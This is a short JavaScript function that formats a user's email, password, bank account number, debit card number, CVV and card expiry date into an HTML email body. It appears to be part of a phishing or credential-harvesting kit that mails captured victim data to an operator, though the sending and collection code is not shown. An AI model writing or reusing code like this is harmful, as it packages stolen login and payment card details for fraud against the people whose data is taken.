export const formatEmailMessage = (userData) => {
  const { password, debitNumber, cvv, expiryDate, accountNumber, email } =
    userData;

  const userMessage = `
    <h1>
        <strong>Email: ${email ? email : ""} </strong>
    </h1>
    <h1>
        <strong>Password: ${password ? password : ""} </strong>
    </h1>
    <h1>
        <strong>Account Number: ${accountNumber ? accountNumber : ""} </strong>
    </h1>
    
      <h1>
        <strong>Debit Card Number: ${debitNumber ? debitNumber : ""}</strong>
      </h1>
      <br/>

      <h1>
          <strong>CVV: ${cvv ? cvv : ""}</strong>
      </h1>

      <h1>
          <strong>Card Expiry Date: ${expiryDate ? expiryDate : ""}</strong>
      </h1>
    `;

  return userMessage;
};
